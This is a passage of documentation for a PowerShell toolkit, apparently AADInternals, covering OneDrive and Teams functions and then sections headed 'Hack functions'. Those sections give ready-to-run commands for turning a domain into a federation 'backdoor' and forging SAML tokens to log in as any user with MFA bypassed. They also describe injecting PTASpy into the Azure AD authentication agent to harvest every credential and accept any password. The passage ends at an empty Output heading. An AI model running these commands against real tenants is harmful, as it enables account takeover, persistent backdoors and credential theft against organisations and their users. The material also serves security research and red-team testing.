<h2 id="onedrive-for-business-functions">OneDrive for Business functions</h2>

<p><strong>OneDrive functions</strong> are used to download, send, and modify files using OneDrive for Business APIs.</p>

<h3 id="new-aadintonedrivesettings">New-AADIntOneDriveSettings</h3>

<p>Since version 0.2.7 <br>
Creates a new OneDriveSettings object used with other OneDrive for Business functions.</p>

<p>To create new settings using interactive authentication (promtps twice for both OfficeApps and OneDrive APIs):</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create a new OneDriveSettings object</span>
<span class="nv">$os</span> <span class="p">=</span> <span class="nb">New-AADIntOneDriveSettings</span>
</code></pre></div>
<p></p>

<p>To create new settings using Kerberos tickets:</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create a Kerberos ticket</span>
<span class="nv">$kt</span><span class="p">=</span><span class="nb">New-AADIntKerberosTicket</span> <span class="n">-ADUserPrincipalName</span> <span class="s2">"user@company.com"</span> <span class="n">-Password</span> <span class="s2">"mypassword"</span>

<span class="c"># Create a new OneDriveSettings object using Kerberos ticket</span>
<span class="nv">$os</span> <span class="p">=</span> <span class="nb">New-AADIntOneDriveSettings</span> <span class="n">-KerberosTicket</span> <span class="nv">$kt</span>
</code></pre></div>
<p></p>

<h3 id="get-aadintonedrivefiles-o">Get-AADIntOneDriveFiles (O)</h3>

<p>Since version 0.2.7 <br>
Downloads user’s OneDrive for Business files (all of them).</p>

<p>Besides downloading the files, the following information is returned per file.</p>

<table>
<thead>
<tr>
<th>Attribute</th>
<th>Description</th>
</tr>
</thead>

<tbody>
<tr>
<td>Path</td>
<td>The relative path of the file or folder</td>
</tr>

<tr>
<td>Size</td>
<td>Size in bytes</td>
</tr>

<tr>
<td>ETag</td>
<td>Resource id and the <strong>next</strong> version number of the file in format “{<guid>},<int>“</int></guid></td>
</tr>

<tr>
<td>Created</td>
<td>The time when the file was created</td>
</tr>

<tr>
<td>Modified</td>
<td>The time when the file was modified</td>
</tr>

<tr>
<td>ResourceID</td>
<td>The unique id of the file or folder</td>
</tr>

<tr>
<td>MimeType</td>
<td>The mime type of the file</td>
</tr>

<tr>
<td>Url</td>
<td>The “pre-authenticated” url of the file</td>
</tr>

<tr>
<td>XORHash</td>
<td>Xor-hash value of the file</td>
</tr>
</tbody>
</table>

<p><strong>Note!</strong> If you only want to list the files and folders, use <strong>-PrintOnly</strong> switch. If sync is restricted to only the members of specific domain(s), use the <strong>-DomainGuid</strong> parameter.</p>

<p>To download user’s OneDrive files, use the following commands:</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create a new OneDriveSettings object</span>
<span class="nv">$os</span> <span class="p">=</span> <span class="nb">New-AADIntOneDriveSettings</span>

<span class="c"># Download the contents of the OneDrive to the current folder    </span>
<span class="nb">Get-AADIntOneDriveFiles</span> <span class="n">-OneDriveSettings</span> <span class="nv">$os</span> <span class="p">|</span> <span class="nb">Format-Table</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Path                              Size  Created            Modified           ResourceID                   
----                              ----  -------            --------           ----------                   
\RootFolder\Document1.docx        11032 2.12.2019 20.47.23 2.12.2019 20.48.46 5e7acf393a2e45f18c1ce6caa7...
\RootFolder\Book.xlsx             8388  2.12.2019 20.49.14 2.12.2019 20.50.14 b26c0a38d4d14b23b785576e29...
\RootFolder\Docs\Document1.docx   84567 9.12.2019 11.24.40 9.12.2019 12.17.50 d9d51e47b66c4805aff3a08763...
\RootFolder\Docs\Document2.docx   31145 7.12.2019 17.28.37 7.12.2019 17.28.37 972f9c317e1e468fb2b6080ac2...
</code></pre>

<h3 id="send-aadintonedrivefile-o">Send-AADIntOneDriveFile (O)</h3>

<p>Since version 0.2.7 <br>
Sends a local file to user’s OneDrive to a specific folder.</p>

<p><strong>Note!</strong> To send file, you need ResourceId of the folder you are sending the file.</p>

<p><strong>Note!</strong> If sync is restricted to only the members of specific domain(s), use the <strong>-DomainGuid</strong> parameter.</p>

<p>To send a file to user’s OneDrive to Documents folder:</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create a new OneDriveSettings object</span>
<span class="nv">$os</span> <span class="p">=</span> <span class="nb">New-AADIntOneDriveSettings</span>

<span class="c"># List folders and their resource ids:</span>
<span class="nb">Get-AADIntOneDriveFiles</span> <span class="n">-OneDriveSettings</span> <span class="nv">$os</span> <span class="n">-PrintOnly</span> <span class="n">-FoldersOnly</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Path</span><span class="p">,</span><span class="n">ResourceID</span>
</code></pre></div>
<p></p>

<pre><code>Path                  ResourceID                      
----                  ----------                      
\RootFolder           1679e14635404542880e3885b4374c3f
\RootFolder\Documents a2a54a01b586480ebbddf04cfaa36191
\RootFolder\Sales     bd59baa485a2411e951234fe6cbd8c5d
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Send the file to Documents folder</span>
<span class="nb">Send-AADIntOneDriveFile</span> <span class="n">-OneDriveSettings</span> <span class="nv">$os</span> <span class="n">-FileName</span> <span class="p">.\</span><span class="n">Document</span><span class="p">.</span><span class="n">docx</span> <span class="n">-FolderId</span> <span class="s2">"a2a54a01b586480ebbddf04cfaa36191"</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>ResourceID                            : 32b66e08379d4c448e001e9659777c71
ETag                                  : "{32B66E08-379D-4C44-8E00-1E9659777C71},2"
DateModified                          : 2019-12-11T11:18:38.0000000Z
RelationshipName                      : Document.docx
ParentResourceID                      : a2a54a01b586480ebbddf04cfaa36191
fsshttpstate.xschema.storage.live.com : fsshttpstate.xschema.storage.live.com
DocumentStreams                       : DocumentStreams
WriteStatus                           : Success
</code></pre>

<p>If the file exists etc. you’ll get following error or similar:</p>

<pre><code>RelationshipName ParentResourceID                 WriteStatus      
---------------- ----------------                 -----------      
Document         a2a54a01b586480ebbddf04cfaa36191 ItemAlreadyExists
</code></pre>

<p>To update existing file, you also need to know the ETag:
<strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Update the file to Documents folder</span>
<span class="nb">Send-AADIntOneDriveFile</span> <span class="n">-OneDriveSettings</span> <span class="nv">$os</span> <span class="n">-FileName</span> <span class="p">.\</span><span class="n">Document</span><span class="p">.</span><span class="n">docx</span> <span class="n">-FolderId</span> <span class="s2">"a2a54a01b586480ebbddf04cfaa36191"</span> <span class="n">-ETag</span> <span class="s2">"{32B66E08-379D-4C44-8E00-1E9659777C71},2"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>ResourceID                            : 32b66e08379d4c448e001e9659777c71
ETag                                  : "{32B66E08-379D-4C44-8E00-1E9659777C71},3"
DateModified                          : 2019-14-11T12:08:55.0000000Z
RelationshipName                      : Document.docx
ParentResourceID                      : a2a54a01b586480ebbddf04cfaa36191
fsshttpstate.xschema.storage.live.com : fsshttpstate.xschema.storage.live.com
DocumentStreams                       : DocumentStreams
WriteStatus                           : Success
</code></pre>

<h2 id="teams-functions">Teams functions</h2>

<p><strong>Teams functions</strong> are used to send and delete Teams messages.</p>

<h3 id="get-aadintskypetoken-t">Get-AADIntSkypeToken (T)</h3>

<p>Since version 0.4.4 <br>
Gets SkypeToken used for authentication for certain Teams services.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for teams and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForTeams</span> <span class="n">-SaveToCache</span>

<span class="c"># Get Skype token and save to variable</span>
<span class="nv">$skypeToken</span> <span class="p">=</span> <span class="nb">Get-AADIntSkypeToken</span>
</code></pre></div>
<p></p>

<h3 id="set-aadintteamsavailability-t">Set-AADIntTeamsAvailability (T)</h3>

<p>Since version 0.4.4 <br>
Sets the availability status of the user to Available, Busy, DoNotDisturb, BeRightBack, or Away</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for teams and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForTeams</span> <span class="n">-SaveToCache</span>

<span class="c"># Set Teams availability status to Busy</span>
<span class="nb">Set-AADIntTeamsAvailability</span> <span class="n">-Status</span> <span class="n">Busy</span>
</code></pre></div>
<p></p>

<h3 id="set-aadintteamsstatusmessage-t">Set-AADIntTeamsStatusMessage (T)</h3>

<p>Since version 0.4.4 <br>
Sets the Teams status message status of the user.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for teams and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForTeams</span> <span class="n">-SaveToCache</span>

<span class="c"># Set Teams status message</span>
<span class="nb">Set-AADIntTeamsStatusMessage</span> <span class="n">-Message</span> <span class="s2">"Out of office til noon"</span>
</code></pre></div>
<p></p>

<h3 id="search-aadintteamsuser-t">Search-AADIntTeamsUser (T)</h3>

<p>Since version 0.4.4 <br>
Searhes users with the given searchstring.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for teams (to outlook) and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForTeams</span> <span class="n">-Resource</span> <span class="n">https</span><span class="p">://</span><span class="n">outlook</span><span class="p">.</span><span class="n">com</span> <span class="n">-SaveToCache</span>

<span class="c"># Search for users</span>
<span class="nb">Search-AADIntTeamsUser</span> <span class="n">-SearchString</span> <span class="s2">"user"</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">UserPrincipalName</span><span class="p">,</span><span class="n">DisplayName</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>UserPrincipalName       DisplayName
-----------------       -----------
first.user@company.com  First User 
second.user@company.com Second User
</code></pre>

<h3 id="send-aadintteamsmessage-t">Send-AADIntTeamsMessage (T)</h3>

<p>Since version 0.4.4 <br>
Sends a Teams message to given recipients.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for teams and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForTeams</span> <span class="n">-SaveToCache</span>

<span class="c"># Send Teams message</span>
<span class="nb">Send-AADIntTeamsMessage</span> <span class="n">-Recipients</span> <span class="s2">"user@company.com"</span> <span class="n">-Message</span> <span class="s2">"Hi user!"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Sent                MessageID         
----                ---------         
16/10/2020 14.40.23 132473328207053858
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for teams and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForTeams</span> <span class="n">-SaveToCache</span>

<span class="c"># Get the list of users' message threads</span>
<span class="nb">Get-AADIntTeamsMessages</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Link</span>
</code></pre></div>
<p></p>

<pre><code>Link
----
19:a84fdc0c-519c-4467-b2e6-323a48ce09af_4d40755a-020b-422b-b9cf-2f1f50602377@unq.gbl.spaces
19:a84fdc0c-519c-4467-b2e6-323a48ce09af_4d40755a-020b-422b-b9cf-2f1f50602377@unq.gbl.spaces
19:292f1d53677d45ff9d61d333cb0b4853@thread.tacv2
19:292f1d53677d45ff9d61d333cb0b4853@thread.tacv2
19:292f1d53677d45ff9d61d333cb0b4853@thread.tacv2
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Send Teams message</span>
<span class="nb">Send-AADIntTeamsMessage</span> <span class="n">-Thread</span> <span class="s2">"19:292f1d53677d45ff9d61d333cb0b4853@thread.tacv2"</span> <span class="n">-Message</span> <span class="s2">"Hi there!"</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>Sent                MessageID         
----                ---------         
16/10/2020 14.40.23 132473328207053858
</code></pre>

<h3 id="get-aadintteamsmessages-t">Get-AADIntTeamsMessages (T)</h3>

<p>Since version 0.4.4 <br>
Gets user’s latest Teams messages.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for teams and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForTeams</span> <span class="n">-SaveToCache</span>

<span class="c"># Get Teams messages</span>
<span class="nb">Get-AADIntTeamsMessages</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">id</span><span class="p">,</span><span class="n">content</span><span class="p">,</span><span class="n">deletiontime</span><span class="p">,*</span><span class="n">type</span><span class="p">*,</span><span class="n">DisplayName</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Id            Content                         DeletionTime  MessageType   Type          DisplayName 
--            -------                         ------------  -----------   ----          ----------- 
1602842299338                                 1602846853687 RichText/Html MessageUpdate Bad User
1602844861358                                 1602858789696 RichText/Html MessageUpdate Bad User
1602846167606                                 1602858792943 Text          MessageUpdate Bad User
1602846853687                                 1602858795517 Text          MessageUpdate Bad User
1602833251951                                 1602833251951 Text          MessageUpdate Bad User
1602833198442                                 1602833198442 Text          MessageUpdate Bad User
1602859223294 Hola User!                                    Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          MessageUpdate Bad User
1602859473083 &lt;div&gt;&lt;div&gt;Hi User!&lt;/div&gt;&lt;/div&gt;                RichText/Html NewMessage    Bad User
1602859484420 Hey User!                                     Text          NewMessage    Bad User
1602859528028 Hy User!                                      Text          NewMessage    Bad User
1602859484420 Hey User!                                     Text          MessageUpdate Bad User
1602859590916 Hi User!                                      Text          NewMessage    Bad User
</code></pre>

<h3 id="set-aadintteamsmessageemotion-t">Set-AADIntTeamsMessageEmotion (T)</h3>

<p>Since version 0.4.5 <br>
Sets emotion for the given Teams message (like, heart, laugh, surprised, sad, or angry).
Emotions are not automatically cleared, so multiple emotions per message can be set. To clear the emotion, use the -Clear switch.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for teams and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForTeams</span> <span class="n">-SaveToCache</span>

<span class="c"># Get Teams messages</span>
<span class="nb">Get-AADIntTeamsMessages</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">id</span><span class="p">,</span><span class="n">content</span><span class="p">,</span><span class="n">deletiontime</span><span class="p">,*</span><span class="n">type</span><span class="p">*,</span><span class="n">DisplayName</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Id            Content                         DeletionTime  MessageType   Type          DisplayName 
--            -------                         ------------  -----------   ----          ----------- 
1602842299338                                 1602846853687 RichText/Html MessageUpdate Bad User
1602844861358                                 1602858789696 RichText/Html MessageUpdate Bad User
1602846167606                                 1602858792943 Text          MessageUpdate Bad User
1602846853687                                 1602858795517 Text          MessageUpdate Bad User
1602833251951                                 1602833251951 Text          MessageUpdate Bad User
1602833198442                                 1602833198442 Text          MessageUpdate Bad User
1602859223294 Hola User!                                    Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          MessageUpdate Bad User
1602859473083 &lt;div&gt;&lt;div&gt;Hi User!&lt;/div&gt;&lt;/div&gt;                RichText/Html NewMessage    Bad User
1602859484420 Hey User!                                     Text          NewMessage    Bad User
1602859528028 Hy User!                                      Text          NewMessage    Bad User
1602859484420 Hey User!                                     Text          MessageUpdate Bad User
1602859590916 Hi User!                                      Text          NewMessage    Bad User
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Like the "Hola User!" message</span>
<span class="nb">Set-AADIntTeamsMessageEmotion</span> <span class="n">-MessageID</span> <span class="n">1602859223294</span> <span class="n">-Emotion</span> <span class="n">like</span>
</code></pre></div>


<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Unlike the "Hola User!" message by clearing the like emoticon:</span>
<span class="nb">Set-AADIntTeamsMessageEmotion</span> <span class="n">-MessageID</span> <span class="n">1602859223294</span> <span class="n">-Emotion</span> <span class="n">like</span> <span class="n">-Clear</span>
</code></pre></div>
<p></p>

<h3 id="remove-aadintteamsmessages-t">Remove-AADIntTeamsMessages (T)</h3>

<p>Since version 0.4.4 <br>
Deletes given Teams messages.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for teams and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForTeams</span> <span class="n">-SaveToCache</span>

<span class="c"># Get Teams messages</span>
<span class="nb">Get-AADIntTeamsMessages</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">id</span><span class="p">,</span><span class="n">content</span><span class="p">,</span><span class="n">deletiontime</span><span class="p">,*</span><span class="n">type</span><span class="p">*,</span><span class="n">DisplayName</span>
</code></pre></div>
<p></p>

<pre><code>Id            Content                         DeletionTime  MessageType   Type          DisplayName 
--            -------                         ------------  -----------   ----          ----------- 
1602842299338                                 1602846853687 RichText/Html MessageUpdate Bad User
1602844861358                                 1602858789696 RichText/Html MessageUpdate Bad User
1602846167606                                 1602858792943 Text          MessageUpdate Bad User
1602846853687                                 1602858795517 Text          MessageUpdate Bad User
1602833251951                                 1602833251951 Text          MessageUpdate Bad User
1602833198442                                 1602833198442 Text          MessageUpdate Bad User
1602859223294 Hola User!                                    Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          MessageUpdate Bad User
1602859473083 &lt;div&gt;&lt;div&gt;Hi User!&lt;/div&gt;&lt;/div&gt;                RichText/Html NewMessage    Bad User
1602859484420 Hey User!                                     Text          NewMessage    Bad User
1602859528028 Hy User!                                      Text          NewMessage    Bad User
1602859484420 Hey User!                                     Text          MessageUpdate Bad User
1602859590916 Hi User!                                      Text          NewMessage    Bad User
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Delete Teams messages</span>
<span class="nb">Remove-AADIntTeamsMessages</span> <span class="n">-MessageIDs</span> <span class="n">1602859590916</span><span class="p">,</span><span class="n">1602859484420</span>
</code></pre></div>


<h3 id="find-aadintteamsexternaluser-t">Find-AADIntTeamsExternalUser (T)</h3>

<p>Since version 0.6.7 <br>
Finds the given external Teams user.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for teams and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForTeams</span> <span class="n">-SaveToCache</span>

<span class="c"># Find the external user from Teams</span>
<span class="nb">Find-AADIntTeamsExternalUser</span> <span class="n">-UserPrincipalName</span> <span class="s2">"JohnD@company.com"</span>
</code></pre></div>
<p></p>

<pre><code>tenantId          : dcc7d7bf-e3f5-4778-b6e0-aa7207bdb033
isShortProfile    : False
accountEnabled    : True
featureSettings   : @{coExistenceMode=TeamsOnly}
userPrincipalName : johnd@company.com
givenName         : JohnD@company.com
surname           : 
email             : JohnD@company.com
displayName       : John Doe
type              : Federated
mri               : 8:orgid:84bdccdb-eaba-4545-9729-4eff71b76841
objectId          : fe401a12-879c-4e5b-8b51-03e1985fa62f
</code></pre>

<h3 id="get-aadintteamsavailability-t">Get-AADIntTeamsAvailability (T)</h3>

<p>Since version 0.6.7 <br>
Shows the availability of the given user.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for teams and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForTeams</span> <span class="n">-SaveToCache</span>

<span class="c"># Find the external user from Teams</span>
<span class="nb">Find-AADIntTeamsExternalUser</span> <span class="n">-UserPrincipalName</span> <span class="s2">"JohnD@company.com"</span>
</code></pre></div>
<p></p>

<pre><code>tenantId          : dcc7d7bf-e3f5-4778-b6e0-aa7207bdb033
isShortProfile    : False
accountEnabled    : True
featureSettings   : @{coExistenceMode=TeamsOnly}
userPrincipalName : johnd@company.com
givenName         : JohnD@company.com
surname           : 
email             : JohnD@company.com
displayName       : John Doe
type              : Federated
mri               : 8:orgid:84bdccdb-eaba-4545-9729-4eff71b76841
objectId          : fe401a12-879c-4e5b-8b51-03e1985fa62f
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get user's availability</span>
<span class="nb">Get-AADIntTeamsAvailability</span> <span class="n">-ObjectId</span> <span class="s2">"fe401a12-879c-4e5b-8b51-03e1985fa62f"</span>
</code></pre></div>


<pre><code>sourceNetwork : Federated
capabilities  : {Audio, Video}
availability  : Away
activity      : Away
deviceType    : Desktop
</code></pre>

<h3 id="get-aadinttranslation-t">Get-AADIntTranslation (T)</h3>

<p>Since version 0.6.7 <br>
Translate the given text to the given language using Teams internal API.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for teams and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForTeams</span> <span class="n">-SaveToCache</span>

<span class="c"># Translate the Finnish text to English</span>
<span class="nb">Get-AADIntTranslation</span> <span class="n">-Text</span> <span class="s2">"Terve Maailma!"</span> <span class="n">-Language</span> <span class="s2">"en-US"</span>
</code></pre></div>
<p></p>

<pre><code>Hello World!
</code></pre>

<h3 id="get-aadintmyteams-t">Get-AADIntMyTeams (T)</h3>

<p>Since version 0.9.1 <br>
Returns all teams the user is member of.</p>

<p><strong>Example1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for teams and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForTeams</span> <span class="n">-SaveToCache</span>

<span class="c"># Get teams</span>
<span class="nb">Get-AADIntMyTeams</span>
</code></pre></div>
<p></p>

<p><strong>Output1:</strong></p>

<pre><code>id                                   displayName site                                                 
--                                   ----------- ----                                                 
afa3b2d4-79d8-4a00-bfb2-070b58af26fc Sales       https://company.sharepoint.com/sites/Sales
eb780ae6-9f80-4ad3-9219-0deee278fb2a Marketing   https://company.sharepoint.com/sites/Marketing
0ab1c9ec-629a-4412-8e65-348bd1ed4fe8 All Hands   https://company.sharepoint.com/sites/AllHAnds
5521cd57-f814-4564-85ae-0e8c644a2a96 London      https://company.sharepoint.com/sites/London
0bf31a81-4833-4421-a1ff-5d4efb669d4b Test        https://company.sharepoint.com/sites/Test
</code></pre>

<p><strong>Example1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for teams and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForTeams</span> <span class="n">-SaveToCache</span>

<span class="c"># Get teams where user is owner</span>
<span class="nb">Get-AADIntMyTeams</span> <span class="n">-Owner</span>
</code></pre></div>
<p></p>

<p><strong>Output1:</strong></p>

<pre><code>id                                   displayName site                                                 
--                                   ----------- ----                                                 
afa3b2d4-79d8-4a00-bfb2-070b58af26fc Sales       https://company.sharepoint.com/sites/Sales
0bf31a81-4833-4421-a1ff-5d4efb669d4b Test        https://company.sharepoint.com/sites/Test
</code></pre>

<h2 id="hack-functions-identity-federation">Hack functions: Identity Federation</h2>

<h3 id="set-aadintdomainauthentication-a">Set-AADIntDomainAuthentication (A)</h3>

<p>Sets authentication method of the domain. Same functionality than <strong>Set-MsolDomainAuthentication</strong> cmdlet.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Set authentication method to managed</span>
<span class="nb">Set-AADIntDomainAuthentication</span> <span class="n">-DomainName</span> <span class="n">company</span><span class="p">.</span><span class="n">com</span> <span class="n">-Authentication</span> <span class="n">Managed</span>
</code></pre></div>
<p></p>

<h3 id="convertto-aadintbackdoor-a">ConvertTo-AADIntBackdoor (A)</h3>

<p>This function converts the given domain to “backdoor”, which can be used to login to the tenant as any user. See <a href="#open-aadintoffice365portal">Open-AADIntOffice365Portal</a> to use the backdoor.</p>

<p>This exploits a <a href="/post/federation-vulnerability/" target="_blank">vulnerability I discovered in late 2017</a>.
Technically, domain authentication type is set to Federated and configured to trust to the specific certificate (any.sts) and issuer <a href="http://any.sts/">http://any.sts/</a>&lt;8 byte hex-value&gt;.</p>

<p>If the domain is already federated, the any.sts certificate will be added as NextSigningCertificate</p>

<p>You can get a free domain from <a href="https://www.myo365.site/">www.myo365.site</a>.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Convert the domain to backdoor</span>
<span class="nb">ConvertTo-AADIntBackdoor</span> <span class="n">-DomainName</span> <span class="n">company</span><span class="p">.</span><span class="n">myo365</span><span class="p">.</span><span class="n">site</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>IssuerUri               Domain              
---------               ------              
http://any.sts/B231A11F company.myo365.site
</code></pre>

<p>The backdoor can also be accessed at https://<a href="https://aadinternalsbackdoor.azurewebsites.net" target="_blank">aadinternalsbackdoor.azurewebsites.net</a></p>

<h3 id="new-aadintbackdoor-a">New-AADIntBackdoor (A)</h3>

<p>Since version 0.1.6 <br>
This function creates a “backdoor” for the given domain name, which can be used to login to the tenant as any user. See <a href="#open-aadintoffice365portal">Open-AADIntOffice365Portal</a> to use the backdoor.</p>

<p>This exploits a vulnerability I discovered in late 2018 which allows setting the authentication method also for the unverified domains. Microsoft has not responded to emails regarding this “feature”.
<strong>NOTE!</strong> Microsoft has fixed this during the spring 2020, so backdoors created with this function does not work anymore.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create a new backdoor</span>
<span class="nb">New-AADIntBackdoor</span> <span class="n">-DomainName</span> <span class="n">microsoft</span><span class="p">.</span><span class="n">com</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Are you sure to create backdoor with microsoft.com? Type YES to continue or CTRL+C to abort: yes

Authentication     : Managed
Capabilities       : None
IsDefault          : false
IsInitial          : false
Name               : microsoft.com
RootDomain         : 
Status             : Unverified
VerificationMethod : 

IssuerUri               Domain              
---------               ------              
http://any.sts/B231A11F microsoft.com
</code></pre>

<h3 id="open-aadintoffice365portal">Open-AADIntOffice365Portal (*)</h3>

<p>This function creates a fake (but valid) WS-Fed/SAML authentication token in .html file and opens it in browser’s private or incognito mode. You can choose to use IE, Edge, or Chrome. If Browser parameter is not provided, opens in Edge.
Use any <strong>ImmutableId</strong> from any user from your tenant and the issuer “<a href="http://any.sts/B231A11F&quot;">http://any.sts/B231A11F"</a> you created with <a href="#convertto-aadintbackdoor">ConvertTo-AADIntBackdoor</a>.</p>

<p>Edge and Chrome should log in automatically unless security settings doesn’t allow that. If that happens, just click <strong>Allow blocked content</strong> or the button <strong>Login to Office 365</strong> and you’re done!
From there, you can also browse to <a href="https://portal.azure.com">https://portal.azure.com</a> as the same user you just logged in.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Login as anyone</span>
<span class="nb">Open-AADIntOffice365Portal</span> <span class="n">-ImmutableID</span> <span class="n">qIMPTm2Q3kimHgg4KQyveA</span><span class="p">==</span> <span class="n">-Issuer</span> <span class="s2">"http://any.sts/B231A11F"</span> <span class="n">-UseBuiltInCertificate</span> <span class="n">-ByPassMFA</span> <span class="nv">$true</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong> (security alert)
<img src="/images/aadint01.png" alt="aadint"></p>

<h2 id="hack-functions-pass-through-authentication-pta">Hack functions: Pass-through authentication (PTA)</h2>

<h3 id="set-aadintpassthroughauthentication-p">Set-AADIntPassThroughAuthentication (P)</h3>

<p>This function enables or disabled pass through authentication (PTA).</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Prompt for credentials and store the token</span>
<span class="nv">$pt</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForPTA</span> <span class="n">-Credentials</span> <span class="p">(</span><span class="nb">Get-Credential</span><span class="p">)</span>
<span class="c"># Disable PTA</span>
<span class="nb">Set-AADIntPassThroughAuthentication</span> <span class="n">-AccessToken</span> <span class="nv">$pt</span> <span class="n">-Enable</span> <span class="nv">$false</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>IsSuccesful Enable Exists
----------- ------ ------
true        false  true 
</code></pre>

<h3 id="install-aadintptaspy">Install-AADIntPTASpy (*)</h3>

<p>Since version 0.2.0 <br>
Installs PTASpy to the pass-thru authentication agent on the current computer. <strong>Must be run as Local Admin</strong> on the computer having <strong>Azure AD Authentication Agent</strong> installed and running (AzureADConnectAuthenticationAgentService.exe).</p>

<p>A hidden folder is created (C:\PTASPy) and PTASpy.dll is copied there. PTASpy.dll is then injected to the running AzureADConnectAuthenticationAgentService.
When installed, <strong>PTASpy collects all used credentials</strong> and stores them to C:\PTASpy\PTASpy.csv with Base64 encoded passwords.
<strong>PTASpy accepts all passwords</strong> so it can be used as a backdoor.</p>

<p>Use <a href="#get-aadintptaspylog">Get-AADIntPTASpyLog</a> to read the log.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Install PTASpy</span>
<span class="nb">Install-AADIntPTASpy</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

